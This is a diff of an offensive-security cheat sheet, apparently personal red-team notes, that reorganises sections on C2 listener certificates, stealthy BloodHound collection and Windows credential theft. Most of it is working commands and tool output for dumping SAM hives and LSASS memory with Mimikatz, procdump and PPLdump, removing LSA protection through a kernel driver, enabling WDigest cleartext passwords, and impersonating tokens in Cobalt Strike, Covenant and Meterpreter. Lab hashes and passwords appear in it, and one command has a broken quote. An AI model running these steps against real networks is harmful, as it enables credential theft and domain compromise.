@@ -64,26 +64,56 @@ Windows save to file
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\windows\tasks\golden.kirbi")) | Out-File -Filepath c:\windows\tasks\golden.kirbi.b64
 ```
 
-### Generate Self-Signed Certificate
+### SSL Listeners
+
+#### Generate Self-Signed Certificate
 
 Generate
 
 ```
 # first change "CipherString=DEFAULT@SECLEVEL=2" to "CipherString=DEFAULT" in /etc/ssl/openssl.conf
 openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
-cat priv.key cert.crt > nasa.pem
-```
-
-Convert to PFX
-
-```
-openssl pkcs12 -inkey skeler.pem -in cert.crt -export -out skeler.pfx
 ```
 
 Use with msf
 
 ```
+# generate required file
+cat priv.key cert.crt > nasa.pem
+
+# use
 set HandlerSSLCert /home/kali/self_cert/yolo.pem
+```
+
+Use with Covenant
+
+```
+# Convert to PFX
+openssl pkcs12 -inkey skeler.pem -in cert.crt -export -out skeler.pfx
+```
+
+#### LetsEncrypt
+
+Generate
+
+```
+certbot certonly --agree-tos --standalone -m goodguy@gmail.com -d fw.vaultsec.xyz
+```
+
+Use with metasploit
+
+```
+cat privkey.pem cert.pem
+```
+
+Use with Covenant
+
+```
+# Feed the `.pfx` file to Cov in the web interface, set the password.
+cd /etc/letsencrypt/live/fw.vaultsec.xyz/
+
+# set & remember the password
+openssl pkcs12 -export -out certificate.pfx -inkey privkey.pem -in cert.pem -certfile chain.pem
 ```
 
 ### Create Network Share
@@ -1387,7 +1417,7 @@ SharpHound
 beacon> execute-assembly /opt/tools/SharpHound.exe -c All,GpoLocalGroup -d vault.local
 
 # stealth
-beacon> execute-assembly c:\tools\sharphound3.exe -c dconly --stealth
+beacon> execute-assembly c:\tools\sharphound3.exe -c DcOnly --Stealth --RandomizeFilenames
 
 # download
 beacon> download .\20210210043130_BloodHound.zip
@@ -1904,23 +1934,49 @@ beacon> runasadmin
 
 #### Katz
 
-##### LogonPasswords
+##### Resources
+- https://github.com/gentilkiwi/mimikatz
+- https://github.com/gentilkiwi/kekeo
+- https://github.com/S3cur3Th1sSh1t/PowerSharpPack
+- https://github.com/G0ldenGunSec/SharpSecDump
+- https://github.com/itm4n/PPLdump
+- https://github.com/cube0x0/SharpMapExec
+- https://github.com/cube0x0/MiniDump
+- https://github.com/byt3bl33d3r/CrackMapExec
 
-CS
+##### SAM
+
+Manual
 
 ```
-beacon> logonpasswords
-[...]
+# shadowcopy
+cmd> wmic shadowcopy call create Volume='C:\'
+cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
+cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\security C:\users\offsec.corp1\Downloads\security
+
+# registry
+reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
+reg save HKLM\system C:\users\offsec.corp1\Downloads\system
 ```
 
-SafetyKatz
+Secretsdump parse
 
 ```
-beacon> execute-assembly c:\tools\SafetyKatz.exe
-[...]
+# secretsdump.py -sam sam -system system LOCAL
+secretsdump.py -sam sam -system system -security security LOCAL
 ```
 
-##### Security Account Manager
+Meterp
+
+```
+hashdump
+```
+
+Covenant
+
+```
+> SamDump
+```
 
 CS
 
@@ -1932,18 +1988,183 @@ beacon> mimikatz token::elevate lsadump::sam
 [...]
 ```
 
-##### Domain Cached Credentials
+CME
 
-Mimikatz
+```
+cme smb srv02.vualt.local -u locadm -p "yoloyolo1!' --sam
+##### Secrets
+```
+
+##### Cache
+
+CS
 
 ```
 beacon> mimikatz lsadump::cache
+```
 
+Crack
+
+```
 # linux terminal
 hashcat -m 2100
 ```
 
-#### Credential Cache
+SharpSecDump
+
+```
+SharpSecDump.exe -target=sccm.vault.local -u=sccmsvc -p=salt&Vinegar! -d=vault.local
+```
+
+SharpMapExec
+
+```
+# kerberos ticket
+SharpMapExec.exe kerberos winrm /ticket:sccmsvc.ticket /domain:vault.local /computername:sccm-2.vault.local /m:secrets
+
+# password or hash
+SharpMapExec.exe kerberos winrm /user:socadm /rc4:92392cbere646b159f2dd78d36cb968a /domain:vault.local /computername:sccm-2.vault.local /m:secrets
+```
+
+##### LSASS
+
+###### Cobalt Strike LSASS/Logon Passwords
+
+```
+beacon> logonpasswords
+```
+
+SafetyKatz
+
+```
+beacon> execute-assembly c:\tools\SafetyKatz.exe
+[...]
+```
+
+###### Mimikatz Logon Passwords 
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 59564789 (00000000:038ce2f5)
+Session           : RemoteInteractive from 3
+User Name         : offsec
+Domain            : CORP1
+Logon Server      : DC01
+Logon Time        : 4/2/2021 6:15:10 AM
+SID               : S-1-5-21-3736398112-481754977-1285760525-1106
+        msv :
+         [00000003] Primary
+         * Username : offsec
+         * Domain   : CORP1
+         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+[...]
+```
+
+###### Covenant Logon Passwords
+
+```
+> LogonPasswords 
+```
+
+###### Remote LSASS
+
+```
+SharpSecDump.exe -target=sccm.vault.local -u=sccmsvc -p=salt&Vinegar! -d=vault.local
+```
+
+###### Disable LSA protection with Mimikatz
+
+```
+# must be local admin or SYTEM
+mimikatz # !+
+
+# disable PPL (requires uploading mimidrv.sys)
+mimikatz # !processprotect /process:lsass.exe /remove
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+[...]
+```
+
+##### Disable LSA Protection with Invoke-Mimikatz
+
+```
+# upload driver
+> Upload /filepath:"C:\windows\tasks\mimidrv.sys"
+
+# configure the driver service
+> shellcmd sc create mimidrv binPath= C:\windows\tasks\mimidrv.sys type= kernel start= demand
+
+> shellcmd sc start mimidrv
+
+# disable PPL
+Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
+
+# procdump, mimikatz, or custom minidumpwritedump
+> Assembly /assemblyname:"MyMiniDump" /parameters:""
+
+# get local copy
+> download c:\windows\tasks\lsass.dmp
+
+# local windows
+.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit 
+```
+
+###### Disable LSA Protection and Dump with PPLDump
+
+```
+# bypass PPL and create dump
+\PPLdump.exe lsass.exe C:\users\administrator\desktop\lsassdmp.txt
+
+# inline parse
+minidump.exe lsass.dmp
+```
+
+###### Cleartext Creds
+
+Set `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` and wait for next logon.
+
+###### Offline LSASS
+
+Via `procdump.exe`
+
+```
+# get system shell
+> c:\Tools\SysinternalsSuite>PsExec.exe -i -s cmd
+
+# create dump
+>.\procdump.exe -ma lsass.exe c:\tools\lsass.dmp
+
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[13:24:51] Dump 1 initiated: c:\tools\lsass.dmp
+[13:24:52] Dump 1 writing: Estimated dump file size is 45 MB.
+[13:24:52] Dump 1 complete: 45 MB written in 0.7 seconds
+[13:24:52] Dump count reached.
+```
+
+Parse via Mimikatz
+
+```
+mimikatz # sekurlsa::minidump lsass.dmp
+
+mimikatz # sekurlsa::logonpasswords
+```
+
+##### Credential Cache
 
 ```
 # obtain
@@ -1979,7 +2200,7 @@ CS
 beacon> download \\vault.io\SysVol\vault.io\Policies\{FDC369C2-35C2-4D97-B455-BB7839854512}\Machine\Registry.pol
 ```
 
-Creds
+#### Creds
 
 ```
 beacon> make_token vault.io\mssql_svc Passw0rd
@@ -1992,9 +2213,17 @@ beacon> powershell Get-Command *AdmPwd
 beacon> Get-DomainComputer
 ```
 
-#### Impersonation
+Using CrackMapExec
 
-##### Steal token
+```
+cme ldap vic.tim.local -u tom -p October2021 -M laps
+```
+
+### Impersonation
+
+#### Steal token
+
+Cobalt Strike
 
 ```
 # find desired PID
@@ -2008,14 +2237,37 @@ beacon> steal_token 4416
 beacon> rev2self
 ```
 
-##### Make Token
+Covenant
+
+```
+# find users/pid
+> ProcessList
+
+# impersonate
+> ImpersonateUser vault\adm_ryan
+```
+
+MSF Incognito
+
+```
+# load incognito
+meterpreter > load incognito
+
+# list currently used tokens
+meterpreter > list_tokens -u
+
+# impersonate token
+meterpreter > impersonate_token CORP1\\admin
+```
+
+#### Make Token
 
 ```
 beacon> make_token vault\boss_adm Passw0rd
 [+] Impersonated [...]
 ```
 
-##### Overpass-the-Hash
+#### Overpass-the-Hash
 
 enum
 
@@ -2106,42 +2358,6 @@ beacon> execute-assembly /opt/tools/SharpChrome.exe history logins
 - https://github.com/djhohnstein/SharpChrome
 
 
-#### SAM
-
-###### Shadow
-
-```
-cmd> wmic shadowcopy call create Volume='C:\'
-cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
-cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\security C:\users\offsec.corp1\Downloads\security
-```
-
-###### Registry
-
-```
-reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
-reg save HKLM\system C:\users\offsec.corp1\Downloads\system
-```
-
-###### Meterp
-
-```
-hashdump
-```
-
-###### Covenant
-
-```
-> SamDump
-```
-
-###### Secretsdump parse
-
-```
-# secretsdump.py -sam sam -system system LOCAL
-secretsdump.py -sam sam -system system -security security LOCAL
-```
-
 #### LAPS
 
 ```
@@ -2153,162 +2369,6 @@ ps> Import-Module .\LAPSToolkit.ps1
 
 # dump
 > Get-LAPSComputers
-```
-
-#### Token Impersonation
-
-##### Token Impersonation using MSF Incognito
-
-```
-# load incognito
-meterpreter > load incognito
-
-# list currently used tokens
-meterpreter > list_tokens -u
-
-# impersonate token
-meterpreter > impersonate_token CORP1\\admin
-```
-
-##### Token Impersonation Using Covenant
-
-```
-# list processes to see logged on users
-> ps
-[...]
-3816  4472  explorer             2          CORP1\admin                         x64           C:\Windows\Explorer.EXE
-
-# impersonate
-> ImpersonateUser CORP1\admin
-Successfully impersonated: CORP1\admin
-
-> WhoAmI
-
-CORP1\admin
-
-# alternative
-> ImpersonateProcess 3816
-Successfully impersonated: 3816
-
-> WhoAmI
-
-CORP1\admin
-```
-
-#### Logon Passwords
-
-##### Mimikatz Logon Passwords 
-
-```
-mimikatz # privilege::debug
-Privilege '20' OK
-
-mimikatz # sekurlsa::logonpasswords
-
-Authentication Id : 0 ; 59564789 (00000000:038ce2f5)
-Session           : RemoteInteractive from 3
-User Name         : offsec
-Domain            : CORP1
-Logon Server      : DC01
-Logon Time        : 4/2/2021 6:15:10 AM
-SID               : S-1-5-21-3736398112-481754977-1285760525-1106
-        msv :
-         [00000003] Primary
-         * Username : offsec
-         * Domain   : CORP1
-         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
-[...]
-```
-
-##### Disable LSA protection with Mimikatz
-
-```
-# must be local admin or SYTEM
-mimikatz # !+
-
-# disable PPL (requires uploading mimidrv.sys)
-mimikatz # !processprotect /process:lsass.exe /remove
-
-mimikatz # privilege::debug
-Privilege '20' OK
-
-mimikatz # sekurlsa::logonpasswords
-[...]
-```
-
-##### Disable LSA Protection with Invoke-Mimikatz
-
-```
-# upload driver
-> Upload /filepath:"C:\windows\tasks\mimidrv.sys"
-
-# configure the driver service
-> shellcmd sc create mimidrv binPath= C:\windows\tasks\mimidrv.sys type= kernel start= demand
-
-> shellcmd sc start mimidrv
-
-# disable PPL
-Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
-
-# procdump, mimikatz, or custom minidumpwritedump
-> Assembly /assemblyname:"MyMiniDump" /parameters:""
-
-# get local copy
-> download c:\windows\tasks\lsass.dmp
-
-# local windows
-.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit 
-```
-
-##### Disable LSA Protection and Dump with PPLDump
-
-```
-\PPLdump.exe lsass.exe C:\users\administrator\desktop\lsassdmp.txt
-```
-
-##### Covenant Logon Passwords
-
-```
-> Mimikatz privilege::debug sekurlsa::logonpasswords
-[...]
-```
-
-##### Cleartext Creds
-
-Set `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` and wait for next logon.
-
-##### Offline LSASS
-
-Via `procdump.exe`
-
-```
-# get system shell
-> c:\Tools\SysinternalsSuite>PsExec.exe -i -s cmd
-
-# create dump
->.\procdump.exe -ma lsass.exe c:\tools\lsass.dmp
-
-ProcDump v9.0 - Sysinternals process dump utility
-Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
-Sysinternals - www.sysinternals.com
-
-
-ProcDump v9.0 - Sysinternals process dump utility
-Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
-Sysinternals - www.sysinternals.com
-
-[13:24:51] Dump 1 initiated: c:\tools\lsass.dmp
-[13:24:52] Dump 1 writing: Estimated dump file size is 45 MB.
-[13:24:52] Dump 1 complete: 45 MB written in 0.7 seconds
-[13:24:52] Dump count reached.
-```
-
-Parse via Mimikatz
-
-```
-mimikatz # sekurlsa::minidump lsass.dmp
-
-mimikatz # sekurlsa::logonpasswords
 ```
 
 ---
